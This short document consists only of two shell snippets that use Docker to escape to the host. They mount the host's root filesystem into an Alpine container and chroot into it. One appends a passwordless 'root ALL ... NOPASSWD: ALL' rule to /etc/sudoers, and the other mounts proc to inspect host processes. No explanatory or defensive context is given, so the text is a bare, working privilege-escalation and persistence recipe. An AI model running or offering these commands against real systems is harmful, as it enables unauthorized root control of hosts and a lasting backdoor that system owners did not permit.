```shell
 docker run -it --rm -v /:/host alpine sh
 ls /host 
 chroot /host /bin/sh
 echo "root ALL=(ALL) ALL NOPASSWD: ALL" >> /etc/sudoers
```
```shell
 docker run -it -v /:/host alpine sh -c "chroot /host sh" 
 mount -t proc proc /proc
 ps aux
 hostname
```
